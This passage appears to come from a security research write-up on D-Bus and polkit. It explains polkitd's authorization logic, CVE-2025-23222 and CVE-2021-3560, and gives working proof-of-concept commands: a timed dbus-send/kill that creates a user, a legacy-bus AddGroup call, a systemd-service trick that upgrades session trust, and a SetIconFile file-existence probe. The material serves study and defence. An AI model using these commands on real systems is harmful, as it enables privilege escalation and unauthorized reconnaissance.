                          PolkitCheckAuthorizationFlags   flags,
                          PolkitImplicitAuthorization    *out_implicit_authorization,
                          gboolean                        checking_imply,
                          GError                        **error)
{
  // [...]
  if (session_is_local)
    {
      if (session_is_active)
        implicit_authorization = polkit_action_description_get_implicit_active (action_desc); // [1] from <allow_active>
      else
        implicit_authorization = polkit_action_description_get_implicit_inactive (action_desc); // [2] from <allow_inactive>
    }
  else
    {
      implicit_authorization = polkit_action_description_get_implicit_any (action_desc); // [3] from <allow_any>
    }
  // [...]
  /* allow subclasses to rewrite implicit_authorization */
  implicit_authorization = polkit_backend_interactive_authority_check_authorization_sync (interactive_authority, // [4]
                                                                                          caller,
                                                                                          subject,
                                                                                          user_of_subject,
                                                                                          session_is_local,
                                                                                          session_is_active,
                                                                                          action_id,
                                                                                          details,
                                                                                          implicit_authorization);
  // [...]
}
```

Finally, `polkit_backend_common_js_authority_check_authorization_sync()` is called internally. It invokes the registered rule callback functions [5] to determine **whether a new authentication level should be applied**. If no matching rule is found for the given subject and action, the return value is null [6], and the original implicit authorization level is retained.

``` c
// src/polkitbackend/polkitbackendduktapeauthority.c
PolkitImplicitAuthorization
polkit_backend_common_js_authority_check_authorization_sync (PolkitBackendInteractiveAuthority *_authority,
                                                             PolkitSubject                     *caller,
                                                             PolkitSubject                     *subject,
                                                             PolkitIdentity                    *user_for_subject,
                                                             gboolean                           subject_is_local,
                                                             gboolean                           subject_is_active,
                                                             const gchar                       *action_id,
                                                             PolkitDetails                     *details,
                                                             PolkitImplicitAuthorization        implicit)
{
  // [...]
  duk_context *cx = authority->priv->cx;

  duk_set_top (cx, 0);
  duk_get_global_string (cx, "polkit");
  duk_push_string (cx, "_runRules"); // [5]
  call_js_function_with_runaway_killer (authority);
  // [...]
  if (duk_is_null(cx, -1)) { // [6]
    /* this is fine, means there was no match, use implicit authorizations */
    good = TRUE;
    goto out;
  }
  // [...]
}
```

## 3. CVE-2025-23222

Most of this section references **[the openSUSE post](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)**, which contains detailed information about CVE-2025-23222 and is highly recommended reading. It serves as a good example of the types of vulnerabilities that can arise within the dbus mechanism.

CVE-2025-23222 is a vulnerability in **dde-api-proxy** that leads to privilege escalation. The [dde-api-proxy](https://github.com/martyr-deepin/dde-api-proxy) is a proxy service for the DDE ([Deepin](https://www.deepin.org/index/en) Desktop Environment). It is implemented as a system dbus service and runs with root privileges.

For compatibility, dde-api-proxy registers legacy dbus interfaces and forwards requests to the actual backend services. However, when forwarding the requests, it performs **no additional verification**. From the perspective of the backend services, the request appears to originate from the root user, and is therefore processed without further validation.

The openSUSE post provides a concrete example. The `org.deepin.dde.Accounts1.User.AddGroup method` is used to add a user to a specified group, and therefore requires authentication. If a regular user attempts to call this method directly, the request is rejected due to insufficient permissions.

``` bash
user$ gdbus call -y -d org.deepin.dde.Accounts1 -o /org/deepin/dde/Accounts1/User1000 \
    -m org.deepin.dde.Accounts1.User.AddGroup root
Error: GDBus.Error:org.deepin.dde.DBus.Error.Unnamed: Policykit authentication failed
```

However, if the same request is sent via **the legacy bus name `com.deepin.daemon.Accounts.User.AddGroup`**, the proxy service — running as root — will forward the request to the actual service without enforcing additional authentication. As a result, the request is allowed:

``` bash
user$ gdbus call -y -d com.deepin.daemon.Accounts -o /com/deepin/daemon/Accounts/User1000 \
    -m com.deepin.daemon.Accounts.User.AddGroup root
()
```

This vulnerability highlights a lesson: most system bus services run with elevated privileges (root), so any logical bug that bypasses authentication checks can have a significant impact on system.

## 4. CVE-2021-3560

The CVE-2021-3560 vulnerability is a **well-known local privilege escalation vulnerability** in the PolicyKit authentication mechanism. The GitHub Security Lab published an [excellent blog post](https://github.blog/security/vulnerability-research/privilege-escalation-polkit-root-on-linux-with-bug/) explaining how the vulnerability was discovered and exploited in practice. This section references that post extensively, so readers are highly encouraged to read it for a deeper understanding and further technical details!

We can use `dbus-send` to send **account creation** requests — such as creating a new user — to the `accounts-daemon`. The `dbus-daemon` assigns a randomly generated bus name (e.g., `:1.123`) to the sender process (`dbus-send`) and dispatches the request to the appropriate service.

When `accounts-daemon` receives the request, it must verify whether the sender has sufficient privileges, since account creation affects the entire system. To do so, it queries `polkitd` for authorization.

During the authentication process, polkitd attempts to retrieve the UID of the process associated with the bus name (e.g., `:1.123`) from `dbus-daemon`.
1. If the UID is 0 (i.e., `root`), the request is immediately authorized.
2. If the UID is not 0, polkitd checks whether the sender is an administrator:
    - If so, an authentication prompt may appear.
    - If not, the request is denied outright due to insufficient privileges.

Let's take a look at the source code to understand how `polkitd` implements this behavior. In the fixed version of `polkitd` — as seen in [commit a04d13a](https://gitlab.freedesktop.org/polkit/polkit/-/commit/a04d13affe0fa53ff618e07aa8f57f4c0e3b9b81) — if the subject is specified in the form of a bus name, the function `polkit_backend_session_monitor_get_user_for_subject()` calls `polkit_system_bus_name_get_user_sync()` [1] to retrieve the corresponding user credentials.

``` c
polkit_backend_session_monitor_get_user_for_subject (PolkitBackendSessionMonitor  *monitor,
                                                     PolkitSubject                *subject,
                                                     gboolean                     *result_matches,
                                                     GError                      **error)
{
  // [...]
  else if (POLKIT_IS_SYSTEM_BUS_NAME (subject))
    {
      ret = (PolkitIdentity*)polkit_system_bus_name_get_user_sync (POLKIT_SYSTEM_BUS_NAME (subject), NULL, error); // [1]
      matches = TRUE;
    }
  // [...]
}
```

The function `polkit_system_bus_name_get_user_sync()` obtains the UID from the bus name [2] and then constructs a `PolkitUnixUser` object from that UID [3].

``` c
PolkitUnixUser *
polkit_system_bus_name_get_user_sync (PolkitSystemBusName  *system_bus_name,
				      GCancellable         *cancellable,
				      GError              **error)
{
  PolkitUnixUser *ret = NULL;
  guint32 uid;
  
  // [...]
  if (!polkit_system_bus_name_get_creds_sync (system_bus_name, &uid, NULL, // [2]
					      cancellable, error))
    goto out;

  ret = (PolkitUnixUser*)polkit_unix_user_new (uid); // [3]

 out:
  return ret;
}
```

The helper function `polkit_system_bus_name_get_creds_sync()` sends two dbus method calls to the `dbus-daemon`: `GetConnectionUnixUser` [4] to get the UID, and `GetConnectionUnixProcessID` [5] to get the PID associated with the given bus name. If any error occurs during these calls [6], the function returns early with an error.

``` c
static gboolean
polkit_system_bus_name_get_creds_sync (PolkitSystemBusName           *system_bus_name,
				       guint32                       *out_uid,
				       guint32                       *out_pid,
				       GCancellable                  *cancellable,
				       GError                       **error)
{
  gboolean ret = FALSE;
  // [...]
  g_dbus_connection_call (connection, // [4]
			  "org.freedesktop.DBus",       /* name */
			  "/org/freedesktop/DBus",      /* object path */
			  "org.freedesktop.DBus",       /* interface name */
			  "GetConnectionUnixUser",      /* method */
			  // [...]
			  &data);
  g_dbus_connection_call (connection, // [5]
			  "org.freedesktop.DBus",       /* name */
			  "/org/freedesktop/DBus",      /* object path */
			  "org.freedesktop.DBus",       /* interface name */
			  "GetConnectionUnixProcessID", /* method */
			  // [...]
			  &data);

  // [...]
  if (data.caught_error) // [6]
    goto out;

  if (out_uid)
    *out_uid = data.uid;
  if (out_pid)
    *out_pid = data.pid;
  ret = TRUE;
 out:
  // [...]
  return ret;
}
```

However, before the patch, even if an error occurred during the dbus method calls, `polkitd` would **still proceed and return `TRUE` to the caller**. This meant that authentication could continue using **unverified or uninitialized UID data**.

``` diff
@@ -435,6 +435,9 @@ polkit_system_bus_name_get_creds_sync (PolkitSystemBusName           *system_bus
   while (!((data.retrieved_uid && data.retrieved_pid) || data.caught_error))
     g_main_context_iteration (tmp_context, TRUE);
 
-  if (data.caught_error)
-    goto out;
-
   if (out_uid)
     *out_uid = data.uid;
   if (out_pid)
```

If the uninitialized UID happens to **be 0**, the call to `polkit_unix_user_new()` will construct a user object **representing root**, allowing the authentication to **pass without proper validation**.

The following PoC, as demonstrated in the GitHub Security Lab blog post, exploits a race condition. It sends a request to `accounts-daemon` using `dbus-send`, and then kills the process just after the dbus message is dispatched but before the `dbus-daemon` has time to resolve and respond to the `GetConnectionUnixUser` request. This causes an error in the credential lookup process — but prior to the patch, `polkitd` would ignore the error and proceed, **leaving the UID uninitialized**.

``` bash
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1 & sleep 0.008s ; kill $!
```

## 5. Tricks

### 5.1. Trick 1 - Abuse Rule Limitations

Could a remote client leverage a local session to send a request? If so, it would **allow the authentication level to be escalated from `<allow_any>` to `<allow_active>`**, potentially granting elevated permissions.

**The answer is: yes** — and you can achieve this using `systemctl`. However, this requires that **an active local session already exists on the system**.

#### 5.1.1. How polkitd Determines Session Type and State

When `polkitd` processes a `CheckAuthorization` request, the `check_authorization_sync()` function is called. This function begins by retrieving the session associated with the subject [1], then checks whether the session is local [2] and active [3]:

``` c
// src/polkitbackend/polkitbackendinteractiveauthority.c
static PolkitAuthorizationResult *
check_authorization_sync (PolkitBackendAuthority         *authority,
                          PolkitSubject                  *caller,
                          PolkitSubject                  *subject,
                          const gchar                    *action_id,
                          PolkitDetails                  *details,
                          PolkitCheckAuthorizationFlags   flags,
                          PolkitImplicitAuthorization    *out_implicit_authorization,
                          gboolean                        checking_imply,
                          GError                        **error)
{
  // [...]
  session_for_subject = polkit_backend_session_monitor_get_session_for_subject (priv->session_monitor, // [1]
                                                                                subject,
                                                                                NULL);
  session_is_local = polkit_backend_session_monitor_is_session_local (priv->session_monitor, session_for_subject); // [2]
  session_is_active = polkit_backend_session_monitor_is_session_active (priv->session_monitor, session_for_subject); // [3]
  // [...]
}
```

The session for a given process is retrieved using `polkit_backend_session_monitor_get_session_for_subject()`, which internally calls `sd_pidfd_get_session()` [4]:

``` c
// src/polkitbackend/polkitbackendsessionmonitor-systemd.c
PolkitSubject *
polkit_backend_session_monitor_get_session_for_subject (PolkitBackendSessionMonitor *monitor,
                                                        PolkitSubject               *subject,
                                                        GError                     **error)
{
  // [...]
  if (POLKIT_IS_UNIX_PROCESS (subject))
    process = POLKIT_UNIX_PROCESS (subject); /* We already have a process */
  
  // [...]
  pidfd = polkit_unix_process_get_pidfd (process);
  if (pidfd >= 0)
    {
      if (sd_pidfd_get_session (pidfd, &session_id) >= 0) // [4]
        {
          session = polkit_unix_session_new (session_id);
          goto out;
        }
    }
  
  // [...]
}
```

#### 5.1.2. Session Number Lookup Logic

Internally, the session number is derived from `/proc/<pid>/cgroup`. The format of this string varies depending on whether the session is remote or local.

For remote sessions (e.g., SSH), the session number is found between **`"session-"`** and **`".scope"`**:

``` bash
# From SSH
dbus-test@DBUS-VM:~$ cat /proc/$$/cgroup
0::/user.slice/user-1000.slice/session-536.scope
```

For local sessions (e.g., GUI login), the expected `"session-"` string may be absent. In this case, `polkitd` falls back to extracting the UID using **`"user-"`** and **`".slice"`**, then reads the corresponding environment file from `/run/systemd/users/<UID>` to determine the session ID from the `DISPLAY` field:

``` bash
# From GUI
dbus-test@DBUS-VM:~$ cat /proc/$$/cgroup
0::/user.slice/user-1000.slice/user@1000.service/app.slice/app-org.gnome.Terminal.slice/vte-spawn-ea09222c-5276-4169-adac-9be678580154.scope
dbus-test@DBUS-VM:~$ cat /run/systemd/users/1000
# This is private data. Do not parse.
NAME=dbus-test
STATE=active
STOPPING=no
RUNTIME=/run/user/1000
DISPLAY=2
...
```

#### 5.1.3. Local Session Detection via SEAT

Once the session ID is determined, `polkitd` calls `polkit_backend_session_monitor_is_session_local()` to determine whether the session is considered local. This function queries the session's **`"SEAT"`** property using `sd_session_get_seat()` [1].

``` c
// src/polkitbackend/polkitbackendsessionmonitor-systemd.c
gboolean
polkit_backend_session_monitor_is_session_local (PolkitBackendSessionMonitor *monitor,
                                                 PolkitSubject               *session)
{
  char *seat;

  if (!sd_session_get_seat (polkit_unix_session_get_session_id (POLKIT_UNIX_SESSION (session)), &seat))
    {
      free (seat);
      return TRUE;
    }

  return FALSE;
}

_public_ int sd_session_get_seat(const char *session, char **seat) {
        return session_get_string(session, "SEAT", seat); // [1]
}
```

The corresponding session metadata is stored in `/run/systemd/sessions/<session_id>`. Local sessions typically contain the **`"SEAT"`** key, whereas remote sessions do not — this is the heuristic `polkitd` uses to **differentiate between local and remote sessions**:

``` bash
# session 2 (local session)
dbus-test@DBUS-VM:~$ cat /run/systemd/sessions/2
# This is private data. Do not parse.
UID=1000
USER=dbus-test
...
SEAT=seat0
TTY=tty2
TTY_VALIDITY=from-pam
...

# session 536 (remote session)
dbus-test@DBUS-VM:~$ cat /run/systemd/sessions/536
# This is private data. Do not parse.
UID=1000
USER=dbus-test
...
```

#### 5.1.4. Active Session Detection via STATE

To determine whether a session is active, `polkitd` attempts to retrieve the **`"STATE"`** key [1] from the session metadata. If the value of this key is the string **`"active"`** [2], the session is considered active.

``` c
gboolean
polkit_backend_session_monitor_is_session_active (PolkitBackendSessionMonitor *monitor,
                                                  PolkitSubject               *session)
{
  const char *session_id;
  char *state;
  uid_t uid;
  gboolean is_active = FALSE;

  session_id = polkit_unix_session_get_session_id (POLKIT_UNIX_SESSION (session));

  if (sd_session_get_uid (session_id, &uid) < 0)
    goto fallback;

  if (sd_uid_get_state (uid, &state) < 0)
    goto fallback;

  is_active = (g_strcmp0 (state, "active") == 0); // [2]
  free (state);

  return is_active;
}

_public_ int sd_uid_get_state(uid_t uid, char**state) {
        // [...]
        r = file_of_uid(uid, &p);
        
        // [...]
        r = parse_env_file(NULL, p, "STATE", &s); // [1]
        
        // [...]
}
```

#### 5.1.5. Local Session Pivot via User-Level systemd Service

A user can create a systemd service file under `/home/<user_name>/.config/systemd/user` and use `systemctl` to run the service in the background under their user context.

Here, we define a systemd user service file `myscript.service`, which runs a shell script `myscript.sh` located in the user's home directory:

```
[Unit]
Description=My user-level shell script

[Service]
ExecStart=%h/myscript.sh
Type=oneshot

[Install]
WantedBy=default.targe
```

To start the service, the following commands are used:

``` bash
systemctl --user daemon-load
systemctl --user enable myscript.service
systemctl --user start myscript.service
```

Once the service is running, we can inspect its cgroup assignment via `/proc/<PID>/cgroup`. Since the cgroup path does not include `"session-"` or `".scope"`, `polkitd` will fall back to using UID-based metadata (e.g., `/run/systemd/users/<UID>`), just like **it does for local sessions**:

``` bash
dbus-test@DBUS-VM:~$ cat /proc/20475/cgroup
0::/user.slice/user-1000.slice/user@1000.service/app.slice/myscript.service
```

This means that a remote user can use `systemctl` to start a service that appears (to `polkitd`) as part of a local user session. As a result, the user can pivot into a local session context, allowing authorization to **be evaluated under `<allow_active>` instead of `<allow_any>`**, thus lowering the authentication requirement for privileged operations.

### 5.2. Trick 2 - Side Channel Existing Root File

Since most system dbus services run as root, it is possible for them to **perform privileged operations on behalf of unprivileged users**.

One such method is `SetIconFile`, exported by `accounts-daemon` (implemented as `/usr/libexec/accounts-daemon`). This method allows updating a user's icon file, which is displayed on the login screen.

The function `user_change_icon_file_authorized_cb()` handles this request. It first checks the file's type and size — only regular files are allowed to be used as icon files [1]. Then, it drops privileges to the target user and runs `cat` to read the file's contents [2]. If the number of bytes read does not match the expected file size, the operation fails with an `"unknown reason"` error [3].

``` c
// src/user.c
static void
user_change_icon_file_authorized_cb (Daemon                *daemon,
                                     User                  *user,
                                     GDBusMethodInvocation *context,
                                     gpointer               data)

{
        // [...]
        info = g_file_query_info (file, G_FILE_ATTRIBUTE_UNIX_MODE ","
                                  G_FILE_ATTRIBUTE_STANDARD_TYPE ","
                                  G_FILE_ATTRIBUTE_STANDARD_SIZE,
                                  0, NULL, NULL);
        mode = g_file_info_get_attribute_uint32 (info, G_FILE_ATTRIBUTE_UNIX_MODE);
        type = g_file_info_get_file_type (info);
        size = g_file_info_get_attribute_uint64 (info, G_FILE_ATTRIBUTE_STANDARD_SIZE);

        if (type != G_FILE_TYPE_REGULAR) { // [1]
                g_debug ("not a regular file");
                throw_error (context, ERROR_FAILED, "file '%s' is not a regular file", filename);
                return;
        }

        // [...]
        argv[0] = "/bin/cat";
        argv[1] = filename;
        argv[2] = NULL;

        pw = getpwuid (uid);

        if (!g_spawn_async_with_pipes (NULL, (gchar **) argv, NULL, 0, become_user, pw, NULL, NULL, &std_out, NULL, &error)) { // [2]
                throw_error (context, ERROR_FAILED, "reading file '%s' failed: %s", filename, error->message);
                return;
        }

        input = g_unix_input_stream_new (std_out, FALSE);

        bytes = g_output_stream_splice (output, input, G_OUTPUT_STREAM_SPLICE_CLOSE_TARGET, NULL, &error);
        if (bytes < 0 || (gsize) bytes != size) { // [3]
                throw_error (context, ERROR_FAILED, "copying file '%s' to '%s' failed: %s", filename, dest_path, error ? error->message : "unknown reason");
                g_file_delete (dest, NULL, NULL);
                return;
        }
        // [...]
}
```

Even though the actual file content is not leaked, we can still determine **whether a file exists** using this error-based side channel. If the target file does not exist, the file query fails and the service returns a `"not a regular file"` error:

``` bash
dbus-test@DBUS-VM:~$ busctl --system call org.freedesktop.Accounts /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User SetIconFile "s" "/root/file_not_exist"
Call failed: file '/root/file_not_exist' is not a regular file
```

On the other hand, if the file exists but cannot be read (e.g., due to permission issues), we get an `"unknown reason"` error instead:

``` bash
dbus-test@DBUS-VM:~$ busctl --system call org.freedesktop.Accounts /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User SetIconFile "s" "/root/.viminfo"
Call failed: copying file '/root/.viminfo' to '/var/lib/AccountsService/icons/dbus-test' failed: unknown reason
```

As a result, this behavior can be abused to **infer the existence of arbitrary files** — even those located in restricted directories such as `/root` — without needing direct access.

## 6. Cheatsheet

### 6.1. Dbus

The **components** of a dbus service:
- Bus name: e.g., `org.freedesktop.DBus` (well-known) or `:1.100` (unique)
- Object path: e.g., `/org/freedesktop/DBus`
- Interface: e.g., `org.freedesktop.DBus`
- Method: e.g., `GetConnectionUnixProcessID`
- Signature: e.g., `s` (a single string argument)

The **socket path** of dbus:
- System
    - `/run/dbus/system_bus_socket`
- Session
    - `/run/user/1000/bus`
    - `$DBUS_SESSION_BUS_ADDRESS`

The **dbus daemon** information:
- System
    - Command: `@dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only`
    - Configuration: `/usr/share/dbus-1/system.conf`
- Session
    - Command: `/usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only`
    - Configuration: `/usr/share/dbus-1/session.conf`

The dbus **service** file:
- System
    - `/usr/share/dbus-1/system-services/`
    - `/etc/dbus-1/system.d/`
    - `/usr/lib/systemd/system/dbus-org.freedesktop.*`
- Session
    - `/usr/share/dbus-1/services/`
    - `/etc/dbus-1/session.d/`

The **method argument** information:
- `/usr/share/dbus-1/interfaces/*`
    - E.g., `com.canonical.UbuntuAdvantage.xml`
    ```
    ...
      <interface name='com.canonical.UbuntuAdvantage.Manager'>
        <method name='Attach'>
          <arg type='s' name='token' direction='in'/>
        </method>
        <method name='Detach'/>
        <property name='Attached' type='b' access='read'/>
        <property name='DaemonVersion' type='s' access='read'/>
      </interface>
    ...
    ```

**Command `busctl`**:

``` bash
# Show all available dbus name
## System
busctl --system list
## Session
busctl --user list

# Get object paths
busctl --system tree org.freedesktop.login1

# Introspect interfaces and methods
busctl --system introspect org.freedesktop.login1 /org/freedesktop/login1

# Call method
busctl --system call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager PowerOff 'b' 1

# Get property
busctl --system get-property org.freedesktop.oom1 /org/freedesktop/LogControl1 org.freedesktop.LogControl1 LogLevel

# Set property
busctl --system set-property org.freedesktop.oom1 /org/freedesktop/LogControl1 org.freedesktop.LogControl1 LogLevel s "aaa"
```

### 6.2 Polkit

**Rules**
- `/usr/share/polkit-1/rules.d/*.rules`
    - E.g., `20-gnome-initial-setup.rules`
    ``` js
    polkit.addRule(function(action, subject) {
        if (subject.user !== 'gnome-initial-setup')
            return undefined;
    
        var actionMatches = (action.id.indexOf('org.freedesktop.hostname1.') === 0 ||
                            action.id.indexOf('org.freedesktop.NetworkManager.') === 0 ||
                            action.id.indexOf('org.freedesktop.locale1.') === 0 ||
                            action.id.indexOf('org.freedesktop.accounts.') === 0 ||
                            action.id.indexOf('org.freedesktop.timedate1.') === 0 ||
                            action.id.indexOf('org.freedesktop.realmd.') === 0 ||
                            action.id.indexOf('com.endlessm.ParentalControls.') === 0 ||
                            action.id.indexOf('org.fedoraproject.thirdparty.') === 0);
    
        if (actionMatches) {
            if (subject.local)
                return 'yes';
            else
                return 'auth_admin';
        }
    
        return undefined;
    });
    ```

**Actions**
- `/usr/share/polkit-1/actions/*.policy`
    - E.g., `com.canonical.UbuntuAdvantage.policy`
    ```
    ...
      <action id="com.canonical.UbuntuAdvantage.attach">
        <description gettext-domain="ubuntu-advantage-desktop-daemon">Attach machine to Ubuntu Pro</description>
        <message gettext-domain="ubuntu-advantage-desktop-daemon">Authentication is required to attach this machine to Ubuntu Pro</message>
        <defaults>
          <allow_any>auth_admin</allow_any>
          <allow_inactive>auth_admin</allow_inactive>
          <allow_active>auth_admin_keep</allow_active>
        </defaults>
      </action>
    ...
    ```

**Commands**
``` bash
# Verify whether a process has permission to perform a specified action
pkcheck --action-id org.freedesktop.login1.power-off --enable-internal-agent --allow-user-interaction --process $$

# Show the rule details for the given action ID
pkaction -v -a org.freedesktop.login1.power-off

# Agent auth helper
/usr/lib/polkit-1/polkit-agent-helper-1
```